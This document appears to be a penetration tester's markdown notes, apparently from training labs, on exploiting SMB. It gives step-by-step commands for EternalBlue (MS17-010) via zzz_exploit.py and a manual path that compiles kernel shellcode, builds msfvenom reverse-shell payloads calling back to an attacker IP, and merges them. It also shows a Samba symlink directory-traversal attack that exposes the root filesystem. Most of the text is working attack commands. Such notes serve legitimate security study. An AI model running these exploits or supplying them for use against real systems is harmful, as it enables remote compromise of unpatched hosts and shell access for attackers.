## SMB

### EternalBlue

There are two ways of exploiting this, one where named pipes are accessible and one where they are not.  You will know if they are accessible because if you try to run the zzz exploit, you will get an error that says `Not found accessible named pipe` when none are there.

<u>With named pipes:</u>

1. Use the zzz exploit, which is the version easily found on Searchsploit or that can be found in the link for the exploit without named pipes.  This is simply executed, but requires mysmb.py in the same folder:

   ```bash
   python ~/opt/exploits/eternalblue/MS17-010/zzz_exploit.py 10.10.10.40
   ```

<u>Without named pipes:</u>

1. You must compile some kernel shellcode and create a payload, then combine them and send it as a payload, as described here: https://root4loot.com/post/eternalblue_manual_exploit/.  First clone this repository: 

   ```bash
   git clone https://github.com/worawit/MS17-010.git
   ```

2. Compile kernel shellcode:

   ```bash
   # x86
   nasm -f bin ~/opt/exploits/eternalblue/MS17-010/shellcode/eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin
   
   # x64
   nasm -f bin ~/opt/exploits/eternalblue/MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
   ```

3. Create a payload in raw format:

   ````bash
   # x86
   msfvenom -p windows/shell_reverse_tcp LPORT=8000 LHOST=10.10.14.37 --platform windows -a x86 --format raw -o sc_x86_payload.bin
   
   # x64
   msfvenom -p windows/x64/shell_reverse_tcp LPORT=8000 LHOST=10.10.14.37 --platform windows -a x64 --format raw -o sc_x64_payload.bin
   ````

4. Combine the bin files together:

   ```bash
   # x86
   cat sc_x86_kernel.bin sc_x86_payload.bin > sc_x86.bin
   
   # x64
   cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
   ```

5. OPTIONAL: You can also merge both the x86 and x64 binaries together to create an all-purpose binary as well.  One site suggested using different listening ports.

   ```bash
   python ~/opt/exploits/eternalblue/MS17-010/shellcode/eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
   ```

6. Run the exploit using the created bin file from above:

   ```bash
   python ~/opt/exploits/eternalblue/MS17-010/eternalblue_exploit7.py 10.10.10.40 sc_x86.bin
   ```

### Symlink Traversal

Discussed here: https://www.exploit-db.com/exploits/33599

1. Set Library Path:

   ```bash
   export LD_LIBRARY_PATH="/home/coyote/opt/tools/samba_dir_traversal/lib:$LD_LIBRARY_PATH"
   ```

2. Connect with custom client, issuing symlink command:

   ```bash
   # Connect
   /home/coyote/opt/tools/samba_dir_traversal/bin/smbclient //10.11.1.136/Bob\ Share --option='client min protocol=NT1'
   # Issue symlink command
   symlink / rootfs
   
   /home/coyote/opt/tools/samba_dir_traversal/bin/smbclient //10.11.1.146/SusieShare
   ```

   